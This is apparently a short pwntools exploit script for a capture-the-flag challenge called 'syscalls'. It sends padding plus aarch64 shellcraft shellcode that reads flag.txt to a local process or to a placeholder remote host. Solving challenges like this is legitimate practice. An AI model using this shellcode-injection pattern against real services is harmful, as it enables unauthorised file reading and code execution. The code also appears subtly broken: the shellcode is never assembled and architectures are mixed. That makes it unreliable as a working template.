#!/usr/bin/env python3

from pwn import *

exe = ELF("./syscalls_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    shellcode= "a"*40 + shellcraft.aarch64.linux.cat('flag.txt') + shellcraft.exit(0)
    print(shellcode)
    r.send(shellcode)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
